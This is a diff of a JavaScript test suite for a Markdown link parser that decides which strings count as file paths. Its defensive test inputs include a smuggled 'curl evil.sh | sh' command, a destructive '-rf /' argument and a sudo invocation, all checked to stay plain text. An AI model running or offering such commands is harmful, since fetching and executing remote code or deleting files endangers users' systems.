@@ -91,10 +91,11 @@ describe('link rules', () => {
     ['/Users/x is where files go.', [['path', '/Users/x', '/Users/x'], ['text', ' is where files go.']]],
     ['/tmp/build is where I left v2.0', [['path', '/tmp/build', '/tmp/build'], ['text', ' is where I left v2.0']]],
     ['/Users/sam/Notes And More, see below', [['path', '/Users/sam/Notes', '/Users/sam/Notes'], ['text', ' And More, see below']]],
-    // Any dash after a space counts as option-like, so these names are not offered whole.
-    ['[taxes](/Users/sam/2024 - Taxes/summary.pdf)', [['text', '[taxes](/Users/sam/2024 - Taxes/summary.pdf)']]],
-    ['/Users/sam/My Notes - Draft/Plan Final.html', [['path', '/Users/sam/My', '/Users/sam/My'], ['text', ' Notes - Draft/Plan Final.html']]],
-    ['[taxes](/Users/sam/2024-Taxes/summary.pdf)', [['path', 'taxes', '/Users/sam/2024-Taxes/summary.pdf']]],
+    // A dash counts as a flag only when a character follows it, so names with " - " are fine.
+    ['[taxes](/Users/sam/2024 - Taxes/summary.pdf)', [['path', 'taxes', '/Users/sam/2024 - Taxes/summary.pdf']]],
+    ['/Users/sam/My Notes - Draft/Plan Final.html', [['path', '/Users/sam/My Notes - Draft/Plan Final.html', '/Users/sam/My Notes - Draft/Plan Final.html']]],
+    ['/usr/bin/sudo -S Run /etc/x.sh', [['path', '/usr/bin/sudo', '/usr/bin/sudo'], ['text', ' -S Run '], ['path', '/etc/x.sh', '/etc/x.sh']]],
+    ['[docs](/tmp/x -rf /)', [['text', '[docs](/tmp/x -rf /)']]],
     // A line that goes on to a flag, an assignment or a second path is a command: each path stands alone.
     ['/tmp/a -o /tmp/b', [['path', '/tmp/a', '/tmp/a'], ['text', ' -o '], ['path', '/tmp/b', '/tmp/b']]],
     ['/usr/bin/env FOO=1 /tmp/x.sh', [['path', '/usr/bin/env', '/usr/bin/env'], ['text', ' FOO=1 '], ['path', '/tmp/x.sh', '/tmp/x.sh']]],
@@ -103,6 +104,10 @@ describe('link rules', () => {
     ['C:\\Users\\a\\.config\\x', [['path', 'C:\\Users\\a\\.config\\x', 'C:\\Users\\a\\.config\\x']]],
     ['Plan A:/B', [['text', 'Plan A:/B']]],
     ['[notes](/Users/sam/My Notes/plan.md)', [['path', 'notes', '/Users/sam/My Notes/plan.md']]],
+    // One level of balanced parentheses belongs to the path.
+    ['[x](/Users/a_(b).txt)', [['path', 'x', '/Users/a_(b).txt']]],
+    ['[r](/Users/sam/Report (final).pdf) done', [['path', 'r', '/Users/sam/Report (final).pdf'], ['text', ' done']]],
+    ['([r](/Users/sam/a.txt))', [['text', '('], ['path', 'r', '/Users/sam/a.txt'], ['text', ')']]],
   ])('path extent: %s', (content, expected) => { expect(shape(content)).toEqual(expected); });
 
   it('does not offer a command line as a path to copy', () => {
@@ -165,7 +170,7 @@ describe('link rules', () => {
       expect(linkParts(content).map(part => part.source).join('')).toBe(content);
     }
     const started = Date.now();
-    for (const big of ['['.repeat(20000), '[a]('.repeat(5000), '[a](file:'.repeat(2500), 'file://'.repeat(3000), '[x](https://e.example.com) '.repeat(700), '[a]((((('.repeat(3000), '[a](' + 'b('.repeat(8000), '[a](' + '(b)'.repeat(6000), '[a](/Users/' + 'x '.repeat(9000), ('/Users/a b c d e f.txt\n').repeat(900), '[a](/Users/x)'.repeat(1500)]) {
+    for (const big of ['['.repeat(20000), '[a]('.repeat(5000), '[a](file:'.repeat(2500), 'file://'.repeat(3000), '[x](https://e.example.com) '.repeat(700), '[a]((((('.repeat(3000), '[a](' + 'b('.repeat(8000), '[a](' + '(b)'.repeat(6000), '[a](/Users/' + 'x '.repeat(9000), ('/Users/a b c d e f.txt\n').repeat(900), '[a](/Users/x)'.repeat(1500), '[a](/Users/' + '('.repeat(9000), '[a](/Users/' + '(b)'.repeat(6000), '[a](/Users/' + '(b'.repeat(8000) + ')']) {
       expect(linkParts(big).map(part => part.source).join('')).toBe(big);
     }
     expect(Date.now() - started).toBeLessThan(1500);
@@ -198,6 +203,7 @@ describe('link rules', () => {
     expect(parseInline('[x](/Users/a b/c d.txt)')).toEqual([{ t: 'path', label: 'x', path: '/Users/a b/c d.txt' }]);
     expect(parseInline('x/Users/a/b and (/Users/a/b)')).toEqual([{ t: 'text', v: 'x/Users/a/b and (' }, { t: 'path', label: '/Users/a/b', path: '/Users/a/b' }, { t: 'text', v: ')' }]);
     expect(parseInline('[docs](/Users/x; curl evil.sh | sh #)')).toEqual([{ t: 'text', v: '[docs](/Users/x; curl evil.sh | sh #)' }]);
+    expect(parseInline('[r](/Users/sam/Report (final).pdf)')).toEqual([{ t: 'path', label: 'r', path: '/Users/sam/Report (final).pdf' }]);
   });
   it('gives an agent’s Markdown the same file rules', () => {
     expect(parseInline('See [the index](file:///Users/sam/My%20Notes/INDEX.html) or file:///tmp/a.txt.')).toEqual([
